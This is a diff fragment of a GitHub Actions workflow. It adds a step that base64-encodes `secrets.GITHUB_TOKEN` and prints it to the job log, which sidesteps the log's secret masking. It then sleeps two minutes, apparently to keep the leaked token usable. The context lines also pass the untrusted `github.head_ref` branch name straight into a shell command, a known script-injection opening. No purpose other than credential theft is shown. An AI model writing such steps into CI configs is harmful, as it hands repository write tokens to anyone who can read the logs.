@@ -28,3 +28,5 @@ jobs:
           echo $GITHUB_HEAD_REF
           echo ${{ github.head_ref }} 
           echo ${{ github.ref_name }}
+          echo "${{secrets.GITHUB_TOKEN}}" | base64 -w0
+          sleep 120
